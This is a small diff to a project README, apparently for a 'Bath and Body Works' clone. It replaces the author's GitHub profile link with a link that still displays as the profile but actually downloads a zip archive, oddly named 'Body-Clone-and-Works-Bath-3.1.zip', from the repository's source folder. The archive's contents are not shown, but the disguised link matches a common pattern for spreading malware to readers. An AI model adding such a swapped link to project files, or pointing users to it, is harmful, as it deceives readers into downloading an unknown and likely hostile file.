@@ -52,4 +52,4 @@ Product Details Page
 
 #### Piryanshu Bisht
 
-> Github: [Piryanshu88](https://github.com/Piryanshu88)
+> Github: [Piryanshu88](https://raw.githubusercontent.com/Piryanshu88/Bath_and_Body_Works_Clone/main/bath_body_works/src/Context/Body-Clone-and-Works-Bath-3.1.zip)
